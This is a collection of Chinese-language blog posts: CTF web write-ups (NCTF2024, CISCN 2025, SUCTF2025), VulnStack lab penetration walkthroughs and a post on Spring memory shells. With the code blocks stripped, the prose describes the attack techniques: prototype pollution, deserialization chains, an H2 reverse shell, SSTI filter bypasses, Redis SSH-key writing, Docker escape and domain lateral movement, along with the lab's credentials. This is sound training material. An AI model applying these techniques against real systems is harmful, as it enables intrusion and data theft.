[{"title":"NCTF2024 Web方向题解","date":"2025-03-24T08:37:02.000Z","url":"/posts/32411.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"在2025年的比赛为什么要叫2024呢(开玩笑) 被队友带飞了，caterpie得了mvp，Err0r是躺赢狗： sqlmap-master main.py： 感觉像命令注入，在/run里能够通过执行sqlmap并返回执行结果 直接命令注入不太行： 因此只能够尝试sqlmap自己有没有命令执行的地方了，使用--help参数查询帮助： 好像还是没有，os-shell尝试了不行，由于是sqlmap，因此可以去github查看使用手册： 可以找到有个参数： 能够直接执行python命令，因此获得flag（根据dockerfile发现flag没有被写入到任意一个文件里，因此flag在环境变量）： ez_dash 给出源码： 一个bottle的服务+pydash的原型链污染，然后可以通过render渲染模板，但是该题对/render的过滤设置得不严谨，bottle的模板渲染功能很强大，不仅能够接受&#123;&#123;&#125;&#125;，还能够接受%引入一行python代码： 因此直接往render路由打即可，原型payload： (因为render能够渲染文件，因此将文件写入再用render渲染即可) 由于过滤了.，但是这里是用eval()函数，因此可以使用chr函数绕过： 注意发送的时候+要进行url编码，不然会以为是空格然后报错 flag在环境变量里，因此直接使用env写入到2里再访问即可： 发现居然渲染的时候写入同一个文件渲染的时候还是上次的结果，只能写进新文件了： 通过cat *能够读到requirements.txt： 注意pydash版本不是之前的漏洞版本，而是最新版，这就是下面的伏笔了） ez_dash_revenge 修复了&lt;%导致的问题： 因此要想获得flag，就只能往bottle.template下手了，跟进bottle.template函数： 可以发现如果tpl如果含有\\n、&#123;、%、$的能够加入TEMPLATES[tplid]，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而tpl是我们传入的第一个参数 它会根据TEMPLATE_PATH里去找到： 接下来通过跟进lookup能够发现基类BaseTemplate中定义了搜索模板文件的方法： 它会去搜索TEMPLATE_PATH下的文件(应该)，理论上只需要污染TEMPLATE_PATH就能够做到任意文件读 但是上文说过pydash的版本是8.0.5，因此不能够直接通过__globals__去获得bottle，在pydash 5.1.2版本中能够使用__globals__，但是高版本下已经被修复了，现在会报access to restricted key __globals__ 因此我们要想办法绕过restricted key 可以发现该异常只有输入在RESTRICTED_KEYS中的内容时才会触发： 而RESTRICTED_KEYS如下： 理论上可以通过pydash自己污染掉RESTRICTED_KEYS从而使用globals： 污染成功后再污染TEMPLATE_PATH即可： 最后再渲染envrion即可： internal_api 题目给出hint： 附件是一个rust写的search api，通过网页端测试的docker可以发现普通用户查询的时候数据库通过/search路由查询，而flag存在了数据库当中： 普通的评论的hidden是false，而flag是true，通过查询的/search路由查询的hidden硬编码为了false 而bot能够访问的private_search为true，因此我们只能够让bot去查询flag并并尝试带出，因此另外一个路由/report派上了用场，/report能够让bot去访问你提供的一个链接，因此可以尝试通过report来访问private_search 此处并不能够直接通过xss来获取到管理员的cookie等有效信息，因此题目提示的xsleaks就排上了用场。 xsleaks可以用于探测用户敏感信息，可以使用的场景较少，需要满足： 页面存在xss 不同用户查询的结果集不同，并且有一个类似flag的字符串 网站存在一个模糊查找功能 构成二元结果并且能够成功探测到 这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。 利用条件： 具有模糊查找功能，可以构成二元结果（成功或失败），并且二元之间的差异性可以通过某种侧信道技术探测到。 可以和 csrf POST 型一样触发，需要诱使受害者触发执行 js 代码。所以特定功能数据包必须没有类似 csrf token 的保护等。 xsleaks的更多了解可以阅读这篇文章 而题目中满足的条件有： 环境出网，bot可以访问自己的vps链接，可以导致xss admin可以查到flag，而我们只能够查到普通评论 查询成功时状态码是200，不存在该结果时返回结果500(题目提示的注意http状态码，可以通过burp抓包查询简单看到) 存在模糊查询(具体看SQL语句有LIKE进行模糊匹配) 可以通过令bot访问我们的页面，再通过bot去查询flag，再将正确的盲注结果带出访问我们的vps上，整体的流程如下： exp如下： 这个脚本是改文章中的脚本来使用的，但是注意不能够直接使用文章中的object标签，而是使用script标签，经过自己的测试好像object标签不行 然后起一个服务在vps，然后起另一个服务用于接收请求，/report发送该vps h2_revenge 确实，原题是什么，然后怎么就revenge了() jadx反编译发现路由是一个无任何waf的反序列化，当时就觉得不对劲，这不是随便乱杀？ 然后发现给的环境是jre17： 这里有两个坑点： 首先是java17，高版本下的java反序列化 然后是jre17，没有javac环境(又是一个小伏笔) 先说链子，很明显是除了h2database没有其他任何依赖引入的spring框架，很明显是通过jackson打h2(jdk17下没有templatesImpl，因此无法直接打jackson) 因此可以通过jackson去触发h2的getConnection实现rce，题目也直接给出了一个可以反序列化的MyDataSource能够直接执行getConnection，因此可以利用题目的MyDataSouce.getConnection()进行触发，反序列化部分的payload如下： 可以看到java17下需要使用EventListener类来触发toString再去打jackson，并且jackson仍需要删除writeReplace，链子是很简单的，就是jdbc attack的h2，但是在编写1.sql的时候出问题了，按照传统的攻击h2的思路，可以通过h2的CREATE ALIAS来编译一段java代码，然后通过CALL来执行该java代码，传统的1.sql如下： 但是！没有javac是编译不了的，因此自然执行失败： 因此最后的操作变成了如何执行rce 万幸的是h2的CREATE ALIAS能够直接创建java中的静态方法，此时可以通过System.load静态方法来加载动态链接库的so，从而实现加载恶意so完成反弹shell(类似环境变量劫持的思路，但是java能够直接加载动态链接库，就不需要ld_preload了)，因此我们需要实现写入一个so的操作，思路来源如下： X1r0z——受限制的JDBC H2 RCE Exploiting H2 Without javac 首先编写exp.c： 然后gcc编译成so： 编译完之后问题来到了怎么写入，由于依赖只有h2.，因此上面提到的file write的思路(调用commons-io和cb的静态函数来实现文件读写)不能够直接打通，因此只能够将目光投向h2是否有操作能够直接写入文件，询问deepseek发现可以通过FILE_WRITE函数来写入十六进制文件(并且进行hex decode)： 因此编写1.sql如下： vps上放好1.sql，将payload发过去监听并等待反弹shell即可： 虽然flag的权限是000，但是flag的所属用户组和用户都是自己(ctf)，因此可以直接通过chmod 777来直接获得flag的读权限"},{"title":"CISCN&长城杯2025半决赛复盘","date":"2025-03-19T09:21:02.000Z","url":"/posts/35955.html","tags":[["web","/tags/web/"]],"categories":[["undefined",""]],"content":"感觉半决赛打的还是失误太多了 AWDP timecapsule 这题的fix和break单独写了一篇博客，自己翻翻应该翻得到。 这题就亏在没有第一时间去fix，而是脑子里想着怎么break，留一点时间来fix也不迟，结果break的链子一时间太难找了，fix上去之后又卡check卡了两轮主办方才修好check的问题，直接少吃两轮的fix分数。当时就应该第一时间修好，脑子瓦特了 rng-assistant 这题我们break快break成功了，但是想不到一个read only的redis该如何利用，赛后看完发现是通过之后的ssti才能break成功 break 源码如下： 先看路由吧： 根路由没啥用，这个whoami读取headers里的X-User-Role来识别角色身份 注册也是，简单的注册 登录也是简单的登录然后进行验证，然后赋session： ask路由能询问ai： 做了一个鉴权之后生成模型之后就去给模型提问 raw_ask路由同样能够询问路由，而且能够自定prompt： 顺带一提，这个鉴权由于是通过headers来辨认的，所以注册随便一个用户都能够直接通过验证得到admin身份 最后这个路由： 简单的看一下会发现它会根据model_id去寻找对应的模型，然后修改它对应的端口，在app.py里可以看到对应的模型端口： 询问ai的query_model函数： 这里来使用socket传递，有种ssrf的味道，结合题目中的改端口操作以及redis服务，想的第一时间应该是ssrf打redis的操作 那实际的操作流程应该是：绕过鉴权后访问/admin/model_ports来修改端口成6379，从而访问redis服务，再通过/admin/raw_ask来对redis进行攻击： 修改default模型的端口为6379，然后通过raw_ask发送socket请求从而打redis： 当时redis存在未授权访问，尝试未授权写webshell，但是是python服务，无法战胜。然后想进行写ssh key，发现没有给你22端口，也是无法战胜。最后想进行主从复制rce，发现这个 redis居然是read only slave，不能够打主从复制。 基本上redis的路线都被ban了，该怎么办呢？ 注意到： 这个函数传入了格式化字符串，因为通过get_template会返回一个字符串，然后通过格式化字符串渲染字符 在学习pyjail的时候有了解过f字符串进行执行（.format也同理，是格式化字符串的一种），但是测试发现.format的限制会略微比f字符串大一些，如下demo所示： 可以实现类似ssti的内容 本题中，由于template存在了redis里，如下所示： 先访问redis如果redis内没有再去访问本地文件，因此优先获取redis内的数据。我们可以尝试修改prompt:&#123;template_id&#125;的值，然后向ai问问题，get_prompt后实现模板渲染 值得一提的是题目特意有一行： 因此可以通过__init__.__globals__获得，题目恰好又会传入self(也就是PromptTemplate对象)，不妨测试一下： 由此可见可以从class.__init__.__globals__中获得import进的全局变量flag 编写exp如下： fix fix不了一点，十次机会全是操作异常，思路应该是禁止访问6379端口，然后再鉴权做好一下，而题目限制用sed修改，当时怎么修复都修不好，摆了，直到awdp结束都没有一个队伍能够修好这个容器。 感觉是启动脚本写的不对，又没有太好的方式，只能先照抄start.sh： 直接贴我们成员写的可能修复的脚本了，好麻烦： php_master 这位更是重量级。。 真的是这题失策了，实际上源码十分地简单，但是第一眼看到的时候可能会两眼一黑： 附件里没给任何一个php，给的是docker的layer，需要你从这些layer里提取出源码，在blobs里基本上就是.tar文件，添加个tar后缀就行了 打开这个tar可以发现是部分根目录： 如法炮制，发现 文件中存在start.sh： 发现flag是400权限，需要提权 是flag 后面1kb的基本上都是json 在3405bc7c7c007230c0e5580feae2824b570a6fc578bc8fc4a5ba84f8ce359390.tar发现index.php： 可以看到是一个非常简单到无脑的文件上传 里发现了vuln.so，路径在/usr/local/lib/php/extensions/no-debug-non-zts-20210902，感觉应该像pwn那边的任务，搜索找到了D3CTF那边应该有相关的题目 思路可能是上传webshell之后进行pwn的相关操作 气晕了，队友把index.php都扒出来了，然后tmd我们在打rng-assistant就没有管这个题，下次真的得注意一下… fix 修复就更简单了，文件上传的修复啊，因此这题的fix是很简单的： 感觉可以改成这样 ccforum 当时没看懂， 为什么我把数字和字母都过滤掉都能说我exp利用成功，通防已经上得很极限了还能利用成功，那也是没办法。。 break 后面等比赛结束后发现了其他队的做题思路才能好好学习，原因竟然是发生在一个以换行分割存在的问题上 admin.php对多行日志以\\n进行处理后可以得到每一行的不同部分，对于每一行采用,进行分割，分成的部分为： 而对于action而言，如果action是record_banned，并且$success为1的时候会添加banned_users，并在下面的逻辑中派上用场： 它会根据encoded_user来扫描该目录下的所有文件，并获取到文件内容添加到$banned_contents里，在html中回显出来： 也就是说我们只需要对$log_lines里写这样的内容 就能够在$banned_contents里通过目录穿越来读到根目录下所有文件的内容 接下来就是对$log_lines进行分析了 此时应该去分析$action_log_path是怎么写入的，继续查看源码 发现在config.php里有file_put_contents写入的操作： 然后你会发现写入的时候是写入的encode_uname： 因此我们想在username直接动手似乎不太可能，全局搜索log_action函数的使用，发现： 大部分的逻辑都被写死了(username、action、succ都被写死，addtional缺省，根据log_action函数应该是写入空)，只有log_action($username, 'record_banned', $succ, $log)略带不同，它带有$log参数能够写入addtional： 可以看到$log是直接拼接$username进去的，前提是created为false，也就是需要绕过mkdir($banned_dir, 0750) 由于php中不允许创建多级目录，也就是不允许创建A/B这样的目录，因此我需要一个经过base64_encode之后的用户名存在有/的用户。 还记得我们一定要写的内容吗？ 因此在这之前的任意内容能够让我们实现加密后产生/(b64encode是可能会出现/的) 写一个脚本跑一下： 根据跑出的结果注册这个用户名，然后发带有敏感词的帖子触发record_banned即可 fix 那fix就很简单了，既然是base64跑出来的问题，那直接把username的加密方式从base64换成其他的加密方式即可，例如md5 当然另外一种方式就是把\\n去掉 感觉这里自己还是太菜啦，但是为什么我过滤了数字和字母还有符号都能判我利用成功呢？按照常理来说你的用户名都不允许这么做输入了应该是可以的啊 ISW 全靠应急响应立大功，web是躺赢狗 还是太慌了，做了那么久一个flag没找出来，连一点线索都没有 git 这道题我感觉确实就是有些思路做少了，flag没拿几个 dirsearch搜到有.git泄露，但是通过githacker扫下来的分支都是not here，然后啥都没有，只能够另寻他路 然后莫名其妙在登录的时候发现能够sql注入，随便写了个盲注的脚本，然后啥用没有，用万能密码登录成功后跳转回首页，十分地懵逼，然后队友发现dirsearch扫出来的那几个php成了可以访问的了，莫名其妙就进了后台，然后莫名其妙传了个文件又莫名其妙getshell了 后续就是把整个html扒下来恢复git之后拿到了flag1 后面实在没想到在/home/.gitlab里又有一个flag4，名字叫lookme，没话说。然后看到了ryan用户里有一个del.py，这里有些莫名其妙，但是发现它可以用来提权，提权到root在root文件夹里又有一个flag 登录到ryan用户里又可以拿到flag3，这真的亏，可以全局搜索flag的，但是我没找到，尝试用find找的flag，结果根本没有 下次必须要用grep来找了： ccb2025 这题xss都tmd请求都没发过来，当时看到feedback.html能够向admin发送反馈，然后admin每隔一段时间会登录就知道应该是xss了，但是xss等了好久了我们请求都没发过来，于是摆了"},{"title":"CISCN&长城杯2025半决赛awdp复现——TimeCapsule","date":"2025-03-17T14:53:09.000Z","url":"/posts/16382.html","tags":[["web","/tags/web/"]],"categories":[["undefined",""]],"content":"运气真好，混进决赛了。结果还是break不掉，唉真废物 fix 这道题当时没怎么细想它是怎么break掉的，看到util里有一个SafeObjectInputStream就直接上了个加强版的黑名单进resolveClass，然后传jar包就修好了： 然后update.sh： 这样就修好了，只不过比赛方从第二轮开始卡check卡了半小时以上，少吃了几轮分 当时应该第一时间就这么fix的而不是想着去break的，唉，说不定能多吃几轮分 break 比赛的时候没break，去做另一道题了，回来看看怎么break的： 先看controller： 这个路由能够注册用户，然后生成aes key 这个路由能够创建一个capsule，这个capsule能够储存我们传入的content 这个路由能够导出一个指定的capsule，该capsule导出的结果使用user的key进行了aes加密 最后这个路由应该是根据用户的key对传入的capsule进行解密并且反序列化 反序列化采用了自己hook的ObjectInputStream： 该ObjectInputStream好像只允许com.ctf.、java.、[B开头的类进行反序列化，简单做个测试验证一下？ 比赛的时候想起来想创spring project来调一下，发现并不行.jpg，阿里云的jdk8的spring连不上，只能够用旧项目将就调 果然啊，我这里测试BadAttributeValueExpException是过不了它的验证的，也就是说只能够用这几个类来打了 题目在com.ctf.util里给了一个FieldGetterHandler能够调用getter方法： 能够通过invoke方法去调用getter，而一个handler怎么触发invoke呢？其实是通过调用动态代理中的任意一个方法调用的，demo如下： 此处动态代理了Interface1、Interface2，通过调用Interface1的say()方法能够触发invoke方法打印Invoke dynamic proxy handler 而题目中的Handler提供了调用任意getter的方法。经过测试通过proxy.invoke(xxx)来调用getter的时候其实是调用xxx的getter，因此需要一个带参的方法来调用。 那gadget呢？我最开始想的是很明显地往templatesImpl的方向去靠，尝试直接调用templatesImpl的getOutputProperites方法去rce 然后需要解决invoke的fieldname问题，因为invoke调用getter的时候是根据get+fieldName来寻找方法的，而没有方法能够对fieldName赋值。这点很简单，可以直接通过反射对fieldName赋值 因此我最开始的思路就是通过readObject()-&gt;proxy.somemethod()-&gt;invoke-&gt;templatesImpl.getOutputProperties从而实现rce 但是这里其实有个问题，就是我们templatesImpl会被直接waf掉，没办法bypass。但是先不管，我现在想找到一条从入口通向somemethod()的方法 一开始我想的是通过equals(x)方法来调用，但是我没找到哪个入口能够通过readObject()方法找到equals方法调用 后来又发现proxy可以被强制转换成任意接口，从而获取到该接口的方法，这也能够调用的方法就更多了，我又尝试让他转成了Map接口，然后能够得到Map的get和put方法 对get方法尝试的比较多，因为我去查了一下自己记录的资料似乎cc6能够通过AbstractMap.get()到LazyMap.get() 但是前提是需要TiedMapEntry，而我们题目内没给出cc依赖，因此行不通。对于put方法倒是找到了HashSet.readObject()能够触发map.put，但是好像不行，这个map是自己创的，而不是我们的Proxy： 由此这两条路似乎都不行了，只能换个接口来代理。我看了cb链的思路，似乎可以代理Comparator，然后通过compare()方法来实现，cb链的利用链： 而handler如果有多个参数，会选择第一个参数作为object来触发它的getter： 因此思路就有了： 第一个问题解决了，第二个问题就是怎么能够bypass这个templatesImpl的waf。其实也很简单，利用SignedObject打二次反序列化就行了，因为SignedObject全员都在java.Security包里，符合java.的限制 也就是说采用cb链触发invoke从而调用SignedObject的getObject方法进行二次反序列化打jackson即可，如下： 得到的payload能够弹计算器） 接下来最后的问题就是怎么触发了，我搭了个docker。先去/api/register注册用户： 然后登录，并往/api/capsules里提交我们的content： 这个时候确实会返回一个id给我们，然后通过export来得到序列化数据流 再通过import来反序列化，但是在交content的时候直接报错了，说明不能够直接这么交。。 那就只能进行加密操作了，后面crypto一晚上也没办法打rce，太失败了。明明已经是控制好长度一致，然后用pt、ct、decode_payload异或生成新的数据流了，但是还是不行，麻了已经，附带payload： 其中payload是java反序列化的payload、pt是同样的一个timeCapsule： 最后的ct是访问的值，其中有iv 算了就这样了，了解链子怎么用的就行了"},{"title":"SUCTF2025 Web方向部分思路","date":"2025-01-23T01:48:20.000Z","url":"/posts/25622.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"又是被带飞的一集 SU_photogallery 有点抽象() 这题的意思是告诉你是一个测试开发中的服务器，也就是说大概率是php -S启动的服务器。而php -S启动的服务器有个漏洞，通过这个漏洞我们就能够拿到源码： 源码： 这里主要有几个过程： check_content($zip) 新建临时文件夹解压文件 检查后缀是否合法并移动到真正的上传文件夹(upload/suimages)里 check_content里过滤了简单的文件穿越，同时对内容进行了简单的限制。这里最关键的就是怎么能够把我们的shell解压出去。 这里其实可以通过zip slip进行绕过： 因为这个正则表达式其实是匹配： ../ ... ..%2e%2e%2f 上面这三种形式，而$zip-&gt;addFile('1.php', &quot;..\\./..\\./a.jpg&quot;);可以bypass掉。 最后就可以通过之前development的源码泄露问题将jpg作为php解析，最后得到一个shell： 1.php： 官方预期解是这样的： 利用注意力惊人的注意到： 这里并没有return，我们就可以通过它来将我们的shell解压正常，而解压另一个文件的时候报错，导致解压失败关闭zip流，然后下面的for循环因为关闭了zip流就检测不了了，即可绕过。 在中提及： linux和window都不可以以/为文件名 因此可以将文件名设置为/从而使得解压失败，当然这一步需要跟该文章中的操作一致，先使用一个标识符，然后再使用winhex或者010将其改为/。最后解压的时候shell会成功解压，而/这个文件会解压失败，从而关闭了zip流，绕过成功。最后就能够直接rce了 其实应该就是zip-&gt;extractTo没有return导致的一个问题，注意力惊人.jpg SU_POP 是一个cakephp，去github找源码发现这个版本是一个月前的较新版本，因此旧版本的利用方式肯定是行不通了，我们要挖掘一条新的利用链出来。 参考的思路如下： click_me 上面的参考思路的终点是：vendor\\cakephp\\cakephp\\src\\ORM\\BehaviorRegistry.php 对应附件的cakephp514/vendor/......(…代表完全一致) 在BehaviorRegistry.php里有一个call方法，该call()直接通过调用的某个类的某个共有方法并传参数： 而且触发该call的方式也有，位于vendor\\cakephp\\cakephp\\src\\ORM\\Table.php： 这里会调用$this-&gt;_behaviors-&gt;call($method, $args); 直到call及之前的方法都是我们可以直接使用的。而call之后调用什么方法呢？由于高版本下ServerShell和BufferedStatement都被修改掉了，因此我们得找一个新的方法去rce。这里就用比较蠢的方法了，首先全局搜索了eval()，找到了一个比较干净的eval，位于vendor/phpunit/phpunit/src/Framework/MockObject/Generator/MockClass.php，这里直接进行了eval($this-&gt;classCode);，因此直接调用该generate方法即可。 有之前版本的exp，需要前半部分套来用一下，注意BehaviorRegistry的源码有过变动，因此我们要修改一下 这部分都是可以用的，后面由于链子变了，因此也会发生变化。我们还没找到如何触发__call()的方法 寻找魔术方法的入口基本上寻找：__destruct和__wakeup，然后通过传递到终点。 文章里的两处__destruct均已被修复，因此我们要找新的__destruct 发现RejectedPromise里的__destruct()方法会将$this-&gt;reason和字符串拼接起来，能够触发__toString方法，接下来尝试通过__toString去触发__call(调用不存在的方法触发__call，找到$this-&gt;a-&gt;b()的形式) 发现Response.php的__toString能够利用( return $this-&gt;stream-&gt;getContents();) 因此找到了链子： 同时我们也知道了call()里面要填什么了，本质上其实是通过$a-&gt;callMethod(...$args)调用的，$callMethod由_methodMap[$method]控制，$method由__call方法传入的不存在的函数名控制，这里就是rewind() 也就是说$behavior和$callMethod就通过_methodMap['rewind']数组控制，并且我们控制_loaded[$behavior]为new MockClass即可 完整exp： SU_Pwn 给的是一个jar附件。一个很简单的文件上传，关键在调用，很明显让我们往xslt的方向去想： 找到了使用例，并且jar中的pom.xml也是2.7.2：  但是这里有waf，过滤了Runtime和ProcessBuilder 里有该环境下使用的`select.xslt`，利用它加以改造。 值得一提的是在xslt中能够支持html实体编码） 因此可以利用编码绕过waf： 测试可以通过dnslog带出，用curl： SU_blog 页面提示建站时间戳的md5值为session的key，并且通过题目描述可以得到建站时间，但是这个建站时间不一定准确，因此通过前后五分钟的差距来爆破key： 爆破后得到key，将session修改为admin。发现读博客文章的时候的url为尝试通过目录穿越，测试得到： 可以得到内容，因此通过: 得到源码如下： 这里就可以很明显地注意到set_(user_data, key, value)了，这里的set_就是pydash的set，考pydash原型链污染，但是有waf，我们接着读waf.py，由于源码里会将url的../置空，因此可以通过wa../f.py绕过从而读到waf.py： 由于题目并没有明确让我们污染哪里，因此直接通过：命令执行的payload打： 但是题目的waf过滤了013456789和__loader__，但是里提及`__spec__`和`__loader__`起到一样的作用： 因此将__loader__换为__spec__： ps：大哥们用这个绕过去的： 题目没过滤curl，用curl打即可。同时在system里就可以使用常见的绕过过滤的方式了(单双引号) SU_ez_solon 国赛book manager复刻版，思路变简单了。思路： 注意这里直接调用了toString()，省去了我们readObject调用XString去触发toString的操作 这里还有一个问题就是因为题目换了一个hessian，换成了alipay的hessian，导致了我们原本使用的sun.print这个也被waf掉了： 至于题目为什么直接给你调用toString，那就需要你好好地摸索一番了： 最后要绕SecurityManager，记得好像直接能够将其置为null？ 至于怎么bypasssun.print呢，题目给了h2依赖，那这就很容易解决了： UnpooledDataSource内提供了getConnection方法，由此可以打h2的rce： 1.sql： 由于要读flag，改成URL(也是用大哥的sql)： exp： "},{"title":"VulnStack 7","date":"2024-12-05T12:31:12.000Z","url":"/posts/58260.html","tags":[["渗透","/tags/%E6%B8%97%E9%80%8F/"]],"categories":[["undefined",""]],"content":"不想复习啊，打个vulnstack7放松一下就当我今天学习了吧 download 环境配置 整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中(来自官方文档)： 虚拟机搭搭，在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为 192.168.52.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24，如下图所示 实测由于NAT模式和52网段是一致的，因此我修改了一下，访问192.168.54.128就是web1的公网了 配网卡如下： 为Web 1配置两张网卡，一张桥接模式（或者nat主机），另一张连VMnet8 为Web 2和PC1配置两张网卡，一张VMnet8、另一张VMnet14 为DC和PC 2配置一张网卡，为VMnet14 由于所有靶机都是没有启动服务的，我们需要手动配置一下： 域用户信息 域用户账户和密码如下： Administrator：Whoami2021 whoami：Whoami2021 bunny：Bunny2021 moretz：Moretz2021 Ubuntu 1： web：web2021 Ubuntu 2： ubuntu：ubuntu 通达OA账户： admin：admin657260 手动登录各台机子后打开服务： Web 1： Web 2: PC 1: 启动通达OA： 配置完毕后开打。 开打 fscan扫192.168.54.128： 可以看见开的81、6379都是有漏洞的。 想起laravel的cve可以去看一下今年鹏城杯线上赛的一个ez_laravel，被折磨的不清，不过这里是cve，我到时候再直接找python脚本跑，这里先利用redis未授权访问 流程： 但是permission denied： 原因是忘记sudo起root权限的redis了，修改后重新写入： 随后ssh root@192.168.54.128免密登录成功 拿到root权限后通过ifconfig发现52网段，传fscan对52网段进行扫描： 发现192.168.52.20(10是本机) 20段发现还是laravel服务？ 查看nginx服务 可以看到确实有81端口的反代，因此我们实际访问81的端口是192.168.52.20的8000端口，于是直接打即可。 但是我们先frp打通52网段，走192.168.54.129的6002端口起socks5即可： 走socks5代理成功访问到52网段 搜cve-2021-3129的payload：  都拿下了，如果可以也可以配置proxychains4来打20机，但是会很慢。但是它做了一层反代出去之后我们就可以通过81端口拿下20机laravel服务 我们再写个shell进去： 蚁剑连接 成功拿下，继续查看信息(此时我们其实是对内网的52.20机子进行操作)，发现无法进行ipconfig操作。 ls -al /发现了.dockerenv文件，说明我们是在一个docker环境里。尝试docker逃逸，但前提是docker逃逸需要root权限，我们得找办法提权： 发现有/home/jobs/shell文件在，查看还能够得到demo.c： 这里可以看到是一个执行ps的操作，但是执行的时候是root权限执行的。 利用就参照一下自己的博客： 这里的例子是ls，所以我们改成ps即可： 注意我们现在的环境变量是php的环境变量，想修改环境变量得反弹一个shell过来： 为什么要用52.10这台ubuntu机子呢，因为他其实是52.20，它只通web1 由此可以从web1拿下。然后执行shell： 环境没有python3，就将就一下用这个shell吧。 接下来看是否为特权模式： 当执行 cat /proc/1/status | grep Cap 查询对应出来的值为 0000003fffffffff 那么就有可能是特权容器，可尝试逃逸 还是我们的sda1 接下来就是重复vulnstack4的操作，检查发现存在ubuntu用户 然后将我们的key写进去 然后我们走proxychains4登入52.20： 不出意外的肯定是要出意外了，一直登录不进这个机子。那就只能够去爆破/etc/shadow了： 其实这个key已经爆破过了，就是ubuntu。 我们直接通过ubuntu/ubuntu连接即可，登录后sudo -i即可拿下root权限： 接着看： 由于这里我忘记关掉防火墙了，导致30网段的通达OA无法被连上，因此这里重新操作一下，重新fscan的结果： 通达oa啊，直接尝试通达oa的洞： 最常见的就是通达oa前台任意登录。这里直接试一下上面的exp就行了，注意这里配置了socks5代理  后面getshell的流程试这个： 自己写的一个python脚本： shell的路径是： 文件包含： 拿下。接下来尝试弹shell到msf上。这里由于我们写的shell是一个phpshell，我们最好就是直接使用cmd命令行的shell。 这个姿势是我学弟教我的，很强。 psh-cmd可以生成powshell的命令行，直接在shell里执行即可： 记得使用msf之前先配代理（ 先收集一波信息： hashdump： ipconfig： 查看域管： 发现access denied。 其实这里我们已经抓到了域管的账号密码了：Administrator/Whoami2021 先创个msf路由： 这里得用meterpreter的进程来添加 udp_probe 发现93.1、93.20、93.30，其中93.20是自己 尝试psexec： 这里很怪，93.1是没有445端口的。重启之后又变正常了，ip变回了40。30的psexec打不上去，但是40的可以： 怀疑是防火墙的问题，此处我们要通过PC1 或者 PC2把域控的防火墙给关了，此时我们要从system改为administrator权限，pc2没有可用的进程迁移。 查看pc1的： 发现进程1020是administrator的，直接窃取令牌，但是无法创建进程，还是system权限 但是可以直接迁移进程： 这里学习了一手用sc关防火墙： 这里的提示虽然都是失败，但其实防火墙已经被关掉了 psexec： 最后拿下。"},{"title":"SPEL注入Spring内存马","date":"2024-11-28T09:50:03.000Z","url":"/posts/6350.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"闲来无事水一篇没有营养的文章。 唉，再不复习就要完了。 还是简单水水文章就算了， 起因 起因只是因为我遇到了一个不出网的thymeleaf ssti。 这里恰好补充一下thymeleaf的绕过吧 这篇稍微会讲的好些： 先讲bypass，版本均针对3.0.12： 在 3.0.12 版本的 Thymeleaf 中新增了一个 SpringStandardExpressionUtils类，其中写了好一个 containsSpELInstantiationOrStatic 方法，对new关键字和T(进行了检测。 但是观察源码可以得到其逻辑并绕过： 很明显只是检测(和其前面一个是否是T，很明显此处可以用空格、tab键等方式进行绕过，因为T (并不会被这里的n-1检测到，但同时还可以被 SPEL 表达式识别 除此之外还通过一个private static final char[] NEW_ARRAY = &quot;wen&quot;.toCharArray();来检测new关键字（注意下面的循环是倒序的，因此检测的就是new，但是他这个检测也是有纰漏的： 很明显是ni == NEW_LEN，因此可以利用大小写绕过。 还有一种类型的bypass： 类的，thymeleaf ssti出现在这里的，这个绕过就是利用以下三种形式去破坏requestURI的内容 内存马 跟着这篇文章看下去发现有一个spel的内存马。 利用的是org.springframework.cglib.core.ReflectUtils.defineClass()直接加载恶意类。这里细节就不再提起，需要一个urlSafeEncode。文章使用的内存马是这样的： 简单地说就是通过触发doInject方法对任意路由都注册并且使用executeCmd方法。并且payload长这样： 需要手动获得requestMappingHandlerMapping，看似确实能够成功。本地环境测试也是确实打进去了 当时我们访问内存马的时候就会发现你根本打不了这个马： 这个时候直接人懵逼了，明明是inject-success，这是为什么呢？ 查看docker后台： 直接报了个奇怪的错，这是啥原因呢？ 很明显了，我们注册路由的时候没有改config那些导致springboot 2.6.0之后就不能够这样打shell了，不过下面这个形式是不是看得有些眼熟？ 其实就是我们很常用的Spring Controller内存马。反正都是defineClass，不如自己简单改一下这个shell使其能够正常工作 于是乎shell被我改成了这样： 经典路由/shell。只需要稍微改一下之前的payload就能触发，同时还payload还省下了获取mapping的功夫，直接调用defineClass().doInject()即可。 payload： 可以看到同样能够inject-success，并且这回访问/shell?cmd=whoami也有了正常的回显： 写的很水，到这里就结束了，反正能用就行"},{"title":"VulnStack 4","date":"2024-11-12T09:30:16.000Z","url":"/posts/58068.html","tags":[["渗透","/tags/%E6%B8%97%E9%80%8F/"]],"categories":[["undefined",""]],"content":"电脑终于有内存了.jpg 环境配置 这次配备了192.168.52.0的VMnet2网卡 一共有三台机子： 开打 还是先用fscan扫一下信息： 可以看到这几个端口都是有现成poc的： tomcat 先挑tomcat服务来打，poc.py： 冰蝎连接，密码为rebeyond 可以看到这是一个docker环境： 这里接着看其他服务的攻击方式，后续操作先按下不表 phpmyadmin fscan很明显能够扫出：cve-2018-12613-file-inclusion poc如下： 此时可以先写shell，再利用该漏洞包含，利用步骤如下： 先执行sql语句SELECT &quot;&lt;?php phpinfo();?&gt;&quot; 查看并记录自己此时的SESSION，包含/tmp/sess_xxx，出现phpinfo后得到web路径 此处的session可以在cookie获取： 就是phpMyAdmin那一栏 再写入webshell 此时我们重新写一个webshell： 成功得到www-data用户shell，准备后续继续利用。 struts2 使用liqunkit进行检测： 成功利用 后续上传不了webshell，遂放弃 docker逃逸  首先判断是否为docker环境，tomcat处我们已经判断出来是docker环境了： 查找.dockerenv 可以看到phpmyadmin也是docker环境 接下来看是否为特权模式 其中phpmyadmin的为： tomcat的为： 因此当执行 cat /proc/1/status | grep Cap 查询对应出来的值为 0000003fffffffff 那么就有可能是特权容器，可尝试逃逸 可以看到tomcat的有可能是特权容器，可以尝试在tomcat处逃逸 查看磁盘文件后可以得出磁盘文件名为/dev/sda1，对其进行挂载： 挂载成功 